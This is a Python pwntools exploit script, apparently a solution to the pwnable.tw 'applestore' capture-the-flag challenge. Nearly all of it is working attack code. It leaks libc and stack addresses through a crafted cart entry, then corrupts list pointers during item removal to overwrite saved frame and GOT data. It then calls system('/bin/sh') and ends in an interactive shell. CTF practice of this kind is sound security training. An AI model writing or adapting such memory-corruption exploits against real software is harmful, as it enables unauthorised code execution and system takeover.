from pwn import *

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./applestore"
ip = "chall.pwnable.tw"
port = 10104

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc_32.so.6"
if LOCAL:
    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(filename)
    # libc = elf.libc
    io = process(["../hacknote/x86_ld-2.23.so.2", filename], env={'LD_PRELOAD': remote_libc}) 
    libc = ELF(remote_libc)
else:
    context.log_level = 'info'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "> \n", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

# bps.append("*0x8048B34")  # show
bps.append("*0x08048A6F") # remove end
# bps.append("*0x08048A1B") # remove


gds['data']=0x0804B068

# mydebug(io, "")

def add(io, num):
    sla(io, "> ", str(2))
    sla(io, "Device Number> ", str(num))

def remove(io, num):
    sla(io, "> ", str(3))
    sla(io, "Item Number> ", str(num))


def show(io, con='y'):
    sla(io, "> ", str(4))
    sla(io, "Let me check your cart. ok? (y/n) > ", con)

def check(io, con='y'):
    sla(io, "> ", str(5))
    sla(io, "Let me check your cart. ok? (y/n) > ", con)


### exploit starts here ### 


# In [8]: 16 * 199 + 10 * 399
# Out[8]: 7174

for _ in range(16):
    add(io, 1)

for _ in range(10):
    add(io, 4)

check(io)
show(io, b'y\x00' + p32(elf.got['puts']) + p32(1) + p32(0) + p32(0xdeadbeef))

io.recvuntil("27: ")
libcaddr = u32(io.recv(4))

libc.address = libcaddr - libc.sym['puts']
system = libc.sym['system']
environ = libc.sym['_environ']

log.info("libcaddr 0x%x", libcaddr)
log.info("libc.address 0x%x", libc.address)
log.info("environ 0x%x", environ)

show(io, b'y\x00' + p32(environ) + p32(1) + p32(0) + p32(0xdeadbeef))

io.recvuntil("27: ")
stackaddr = u32(io.recv(4)) + 4
bufaddr = stackaddr - 0xfffe0610 + 0xfffe04e8
old_ebpaddr = bufaddr + 0x20


log.info("stackaddr 0x%x", stackaddr)
log.info("bufaddr 0x%x", bufaddr)


sla(io, "> ", str(3))
sla(io, "Item Number> ", b'27' + 4*b'\x00' + p32(0) + p32(0x0804B044+0x40-0x24-8) + p32(old_ebpaddr-8))

sla(io, "> ", b"/bin/sh\x00\x00\x00"+p32(system)*2)
# sla(io, "> ", b"\x00\x00" + p32(system)*4)


# 0x81797e4
io.interactive()



